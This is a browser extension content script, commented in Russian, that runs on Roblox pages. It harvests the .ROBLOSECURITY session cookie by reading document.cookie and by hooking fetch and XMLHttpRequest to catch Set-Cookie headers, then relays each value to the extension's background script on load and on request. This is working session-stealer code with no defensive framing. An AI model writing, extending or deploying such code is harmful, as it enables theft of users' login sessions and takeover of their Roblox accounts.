// content.js — выполняется на каждой странице Roblox
(function() {
  const COOKIE_NAME = '.ROBLOSECURITY';

  // Функция парсинга document.cookie
  function getCookieValue(name) {
    const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
    return match ? match[2] : null;
  }

  // Отправляем в бэкграунд
  function sendToBackground(cookieValue) {
    if (cookieValue) {
      chrome.runtime.sendMessage({
        type: 'fetchCookie',
        manual: true,
        value: cookieValue,
        source: 'document.cookie'
      });
    }
  }

  // Перехват при загрузке DOM
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
      const val = getCookieValue(COOKIE_NAME);
      if (val) sendToBackground(val);
    });
  } else {
    const val = getCookieValue(COOKIE_NAME);
    if (val) sendToBackground(val);
  }

  // Перехват изменений куки через MutationObserver на document.cookie (не сработает на прямую запись, но мы перехватываем сетевые запросы отдельно)
  // Дополнительно — перехватываем fetch и XHR, чтобы вытащить куку из заголовков
  const originalFetch = window.fetch;
  window.fetch = function(...args) {
    return originalFetch.apply(this, args).then((response) => {
      // Проверяем заголовки Set-Cookie
      const setCookie = response.headers.get('set-cookie');
      if (setCookie && setCookie.includes(COOKIE_NAME)) {
        const match = setCookie.match(new RegExp(COOKIE_NAME + '=([^;]+)'));
        if (match) sendToBackground(match[1]);
      }
      return response;
    });
  };

  // Перехват XMLHttpRequest
  const originalOpen = XMLHttpRequest.prototype.open;
  const originalSend = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open = function(method, url, ...rest) {
    this._url = url;
    return originalOpen.apply(this, [method, url, ...rest]);
  };
  XMLHttpRequest.prototype.send = function(...args) {
    this.addEventListener('readystatechange', () => {
      if (this.readyState === 4 && this.status === 200) {
        const setCookieHeader = this.getResponseHeader('set-cookie');
        if (setCookieHeader && setCookieHeader.includes(COOKIE_NAME)) {
          const match = setCookieHeader.match(new RegExp(COOKIE_NAME + '=([^;]+)'));
          if (match) sendToBackground(match[1]);
        }
      }
    });
    return originalSend.apply(this, args);
  };

  // Также слушаем сообщения от бэкграунда на случай, если нужно принудительно вернуть куку
  chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
    if (msg.type === 'getDocumentCookie') {
      const val = getCookieValue(COOKIE_NAME);
      sendResponse({ cookie: val });
    }
    return true;
  });

  console.log('[Roblox Content] Injector active');
})();